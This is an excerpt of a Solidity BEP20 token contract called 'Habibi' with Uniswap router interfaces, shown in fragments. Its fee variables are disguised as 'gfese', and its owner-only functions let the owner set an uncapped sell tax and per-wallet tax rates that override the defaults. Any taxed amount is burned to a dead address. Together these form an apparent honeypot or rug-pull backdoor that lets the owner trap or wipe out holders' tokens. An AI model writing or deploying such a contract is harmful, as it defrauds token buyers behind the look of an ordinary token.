...
interface IUniswapV2Factory {
    ...
    function gfeseTo() external view returns (address);
    function gfeseToSetter() external view returns (address);
    ...
    function setgfeseTo(address) external;
    function setgfeseToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinggfeseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinggfeseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinggfeseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinggfeseOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinggfeseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Habibi is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellgfese = 0;

    uint256 private _defaultBuygfese = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipgfese;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellgfese = _value;
    }

    function setSlipgfese(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipgfese[_address] = _value;
    }

    function getSlipgfese(address _address) external view onlyownar returns (uint256) {
        return _slipgfese[_address];
    }


    function setMAccountgfese(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountgfese(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradegfeseAmount = 0;

        if (rF) {
            uint256 tradegfese = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradegfese = _defaultSellgfese;
                }
                if (from == uniswapV2Pair) {

                    tradegfese = _defaultBuygfese;
                }
            }
            if (_slipgfese[from] > 0) {
                tradegfese = _slipgfese[from];
            }

            tradegfeseAmount = _Amount.mul(tradegfese).div(100);
        }


        if (tradegfeseAmount > 0) {
            _balances[from] = _balances[from].sub(tradegfeseAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradegfeseAmount);
            emit Transfer(from, _deadAddress, tradegfeseAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradegfeseAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradegfeseAmount);
        emit Transfer(from, _to, _Amount - tradegfeseAmount);
    }
